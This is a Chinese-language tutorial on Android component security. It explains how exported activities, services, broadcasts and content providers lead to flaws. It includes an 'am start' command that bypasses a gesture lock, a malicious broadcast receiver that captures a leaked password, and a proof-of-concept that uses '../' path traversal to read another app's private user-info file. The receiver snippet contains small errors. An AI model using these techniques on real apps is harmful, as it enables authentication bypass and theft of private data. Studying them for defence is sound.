Android组件安全

首先要知道，Android 中最重要的风险点就是 android:exported=”true” 这一属性。组件被导出就意味着大概率会产生漏洞。
首先了解一下四大组件：activity，service，broadcast，contentprovider。
对于 app 来说，每一个界面都是一个 activity，每一个 activity 都会有着不同的功能，比如注册，登录，手势密码等。每一个 activity 的切换需要不同的条件。
service 服务，伴随着程序启动，会一直在后台运行，主要是检测作用，检测客户端的状态，上传用户的操作。
broadcast 分为两个方面，广播发送者和广播接收者。Android 提供一整套的 api，允许 app 自由的发送和接收广播。
contentProvider是用来保存或者获取数据，并使其对所有应用程序可见。
这是不同应用程序间共享数据的唯一方式，因为android 没有提供所有应用共同访问的公共存储区。比如通讯录数据。

越权绕过

对于 activity 组件，主要会存在越权绕过，比如绕过手势密码，跳过验证阶段。此处可以利用直接启动手势密码之后的活动来进行验证
Default
am start -n 包名/.活动名

若是可以直接启动，则证明存在越权漏洞。

拒绝服务攻击

还有拒绝服务攻击，Android 提供 Intent 机制来协助应用间的交互与通讯，Intent 负责对一次操作的动作、动作涉及的数据进行描述，系统则根据此 Intent 描述，来调用对应的 Activity、 servicer 和 BroadCast 等组件，来完成组件的调用。
如果程序没有对 Intent.getXXXExtra() 获取的异常或者畸形数据处理时没有进行异常捕获，就会导致攻击者可通过向受害者应用发送此类空数据、异常或者畸形数据来使该应用崩溃，简单的说就是通过 intent 发送空数据、异常或畸形数据给应用，来实现让应用崩溃的目的。
对应的不同报错信息
Default
Java.lang.NullPointerException，原因是程序没有对getAction()等获取到的数据进行空指针判断。intent.putExtra("", "");导致空指针异常导致应用崩溃
Java.lang.ClassCastException 原因是程序没有getSerializableExtra()等获取到的数据进行类型判断而进行强制类型转换
Java.lang.IndexOutOfBoundsException，原因是程序没有对getIntegerArrayListExtra()等获取到的数据数组元素大小的判断
Java.lang.ClassNotFoundException，原因是程序没有无法找到
从getSerializableExtra()获取到的序列化类对象的类定义

service服务暴露

以之前版本的某 app 为例，其中的升级服务，传入 PushMsg 的 Serializable 的数据。
此时恶意伪造并启动暴露的service

Broadcast 暴露

比如目标程序如下，
Default
    Intent v1 = new Intent();
    v1.setAction("com.simple.action.server_running");
    v1.putExtra("local_ip",v0.h);
    v1.putExtra("port",v0.i);
    v1.putExtra("code",v0.g);
    v1.putExtra("connected",v0.s);
    v1.putExtra("pwd_predefined",v0.r);
    if(!TextUtils.isEmpty(v0.t)){
        v1.putExtra("connected_usr",v0.t);
    }
    sendBroadcast(v1);
}

该程序通过 intent 隐式传递，并通过 action 匹配发送一个广播，这样系统内其他程序都可以接收到这个广播，然后在广播接收者中编写接收代码，这样就可以通过攻击代码获取敏感数据信息
Default
public void onReceive(Context context,Intent intent){
    String s = null;
    if(intent.getAction().equals("com.sample.action.server_running")){
        String pwd=intent.getStringExtra("connected");
        s="Airdroid => ["+pwd+"]/"+intent.getExtras();
    }
    Toast.makeTest(context,String.format("%sReceived",s),Toast.LENGTH_SHORT).show();
}

content Provider目录遍历漏洞

Android Content Provider 存在文件目录遍历安全漏洞，该漏洞源于对外暴露 Content Provider组件的应用，没有对 Content Provider 组件的访问进行权限控制和对访问的目标文件的Content Query Uri 进行有效判断，攻击者利用该应用暴露的 Content Provider的openFile()接口进行文件目录遍历以达到访问任意可读文件的目的。
此时的条件是对外暴露的Content Provider组件实现了openFile()接口
没有对所访问的目标文件 Uri 进行有效判断，如没有过滤限制如“../”可实现任意可读文件的访问的 Content Query Uri 。
比如，某 APP 的实现中定义了一个可以访问本地文件的 Content Provider 组件，默认的 android:exported=”true” ,对应 com.xxxx.android.jobs.html5.LocalFileContentProvider，该 Provider 实现了 openFile() 接口，通过此接口可以访问内部存储 app_webview 目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过”../”实现目录跨越，实现对任意私有数据的访问。

攻击poc
Default
public void GJContentProviderFileOperations(){
    try{
        InputStream in = getContentResolver().openInputStream(Uri.parse("content://com.xxx.html5.localfile.1/webview/../../shared_prefs/userinfo.xml"));
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int n = in.read(buffer);
        while(n>0){
            out.write(buffer, 0, n);
            n = in.read(buffer);
            Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show();
        }
    }catch(Exception e){
        debugInfo(e.getMessage());
    }
}